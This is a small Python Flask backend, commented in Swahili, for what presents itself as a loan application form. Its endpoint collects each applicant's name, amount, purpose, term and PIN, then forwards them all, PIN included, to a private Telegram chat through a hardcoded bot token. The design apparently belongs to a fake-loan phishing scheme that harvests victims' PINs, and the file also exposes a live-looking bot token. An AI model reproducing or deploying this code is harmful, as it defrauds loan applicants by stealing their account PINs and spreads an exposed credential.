from flask import Flask, request, jsonify
import requests
import random

app = Flask(__name__)

# 🔐 MIPANGILIO YA TELEGRAM
BOT_TOKEN = "7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0"
CHAT_ID = "6958413637"

maombi = {}

# =========================
# KUTUMA KWENYE TELEGRAM
# =========================
def tuma_kwenye_telegram(app_id, data):

    ujumbe = f"""
MAOMBI MAPYA YA MKOPO

Namba ya Maombi: {app_id}
Jina: {data['jina']}
Kiasi: {data['kiasi']}
Lengo: {data['lengo']}
Muda: {data['muda']}
PIN: {data['pin']}
Hali: INASUBIRI (PENDING)
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    requests.post(url, json={
        "chat_id": CHAT_ID,
        "text": ujumbe
    })

# =========================
# HATUA YA 3 ENDPOINT
# =========================
@app.route("/submit-step3", methods=["POST"])
def submit_step3():

    try:
        print("ROUTE HIT")

        data = request.get_json(silent=True)

        if not data:
            data = request.form.to_dict()

        print("DATA RECEIVED:", data)

        app_id = str(random.randint(10000, 99999))

        maombi[app_id] = data
        maombi[app_id]["status"] = "PENDING"

        response = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": CHAT_ID,
                "text": f"📥 NEW APPLICATION\n\n🆔 {app_id}\n\n{data}"
            }
        )

        print("TELEGRAM RESPONSE:", response.text)

        return jsonify({
            "message": "Success",
            "application_id": app_id
        })

    except Exception as e:
        print("ERROR:", str(e))
        return jsonify({"error": str(e)}), 500
